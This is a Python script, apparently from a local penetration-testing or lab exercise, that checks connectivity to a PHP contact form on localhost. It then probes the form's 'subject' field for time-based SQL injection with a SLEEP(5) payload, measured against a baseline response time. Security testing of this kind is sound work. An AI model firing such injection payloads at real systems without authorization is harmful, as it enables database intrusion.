import requests
import time
import socket
import sys

# Configuration - test connectivity first
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 33124
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}/send.php"

def check_connectivity():
    """Check if the target service is reachable"""
    print("="*70)
    print("[+] DIAGNOSTIC: Checking connectivity")
    print("="*70)
    
    # Test 1: TCP connectivity
    print(f"\n[1] Testing TCP connectivity to {TARGET_HOST}:{TARGET_PORT}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((TARGET_HOST, TARGET_PORT))
        sock.close()
        
        if result == 0:
            print(f"    [SUCCESS] Port {TARGET_PORT} is open and accepting connections")
        else:
            print(f"    [FAILED] Port {TARGET_PORT} is closed or blocked (error code: {result})")
            return False
    except Exception as e:
        print(f"    [ERROR] TCP connection failed: {e}")
        return False
    
    # Test 2: HTTP HEAD request (lightweight)
    print(f"\n[2] Testing HTTP HEAD request to {TARGET_URL}")
    try:
        response = requests.head(TARGET_URL, timeout=5, allow_redirects=False)
        print(f"    [SUCCESS] HTTP HEAD returned status: {response.status_code}")
        return True
    except requests.exceptions.ConnectionError as e:
        print(f"    [FAILED] Connection error: {e}")
        return False
    except requests.exceptions.Timeout:
        print(f"    [FAILED] Request timed out")
        return False
    except Exception as e:
        print(f"    [ERROR] HTTP HEAD failed: {e}")
        return False

def test_with_simple_request():
    """Try a simple POST request with minimal data"""
    print(f"\n[3] Testing simple POST request")
    
    simple_data = {
        "fullname": "Test",
        "email": "test@example.com",
        "phone": "123-456-7890",
        "subject": "Test",
        "message": "Test"
    }
    
    session = requests.Session()
    session.headers.update({'Connection': 'close'})
    
    try:
        start_time = time.time()
        response = session.post(
            TARGET_URL,
            data=simple_data,
            timeout=10,
            allow_redirects=False,
            verify=False
        )
        end_time = time.time()
        
        print(f"    [SUCCESS] Request completed in {end_time-start_time:.3f}s")
        print(f"    Status Code: {response.status_code}")
        print(f"    Headers: {dict(response.headers)}")
        
        if response.status_code == 302:
            print(f"    Redirect Location: {response.headers.get('Location', 'Not specified')}")
        
        return True
        
    except Exception as e:
        print(f"    [FAILED] Request failed: {e}")
        return False
    finally:
        session.close()

def attempt_time_based_test():
    """Attempt one time-based payload test if basic connectivity works"""
    print("\n" + "="*70)
    print("[+] ATTEMPTING TIME-BASED SQL INJECTION TEST")
    print("="*70)
    
    benign_data = {
        "fullname": "John Doe",
        "email": "john@example.com",
        "phone": "555-123-4567",
        "subject": "Test Inquiry",
        "message": "This is a test message."
    }
    
    # Test baseline
    print("\n[1] Testing baseline (normal request)")
    session = requests.Session()
    session.headers.update({'Connection': 'close'})
    
    baseline_times = []
    for i in range(2):
        try:
            start = time.time()
            response = session.post(TARGET_URL, data=benign_data, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            baseline_times.append(elapsed)
            print(f"    Baseline {i+1}: {elapsed:.3f}s (Status: {response.status_code})")
        except Exception as e:
            print(f"    Baseline {i+1}: Error - {e}")
    
    # Calculate baseline
    if baseline_times:
        baseline = sum(baseline_times) / len(baseline_times)
        print(f"    Average baseline: {baseline:.3f}s")
    else:
        print("    [ERROR] Could not establish baseline")
        return
    
    # Test one payload
    print("\n[2] Testing time-based payload")
    payload_data = benign_data.copy()
    payload_data['subject'] = "test' AND SLEEP(5)-- -"
    
    try:
        start = time.time()
        response = session.post(TARGET_URL, data=payload_data, timeout=15, allow_redirects=False)
        elapsed = time.time() - start
        
        time_diff = elapsed - baseline
        print(f"    Payload response: {elapsed:.3f}s")
        print(f"    Time difference: {time_diff:.3f}s")
        print(f"    Status: {response.status_code}")
        
        if time_diff >= 4.0:
            print(f"    [!] POTENTIAL INJECTION - Delay detected!")
        else:
            print(f"    [-] No significant delay")
            
    except Exception as e:
        print(f"    [ERROR] Payload test failed: {e}")
    finally:
        session.close()

def main():
    # First check connectivity
    if not check_connectivity():
        print("\n" + "="*70)
        print("[!] CONNECTIVITY CHECK FAILED")
        print("="*70)
        print("\nThe target service is not reachable. Possible causes:")
        print("  1. Service is not running on 127.0.0.1:33124")
        print("  2. Firewall is blocking connections")
        print("  3. Service crashed or is unresponsive")
        print("\nRecommendation: Verify the service is running and accessible.")
        return 1
    
    # Try simple request
    if not test_with_simple_request():
        print("\n[!] Simple POST request failed - service may be unstable")
        return 1
    
    # Attempt time-based test
    attempt_time_based_test()
    
    print("\n" + "="*70)
    print("[+] DIAGNOSTIC COMPLETE")
    print("="*70)
    return 0

if __name__ == "__main__":
    sys.exit(main())

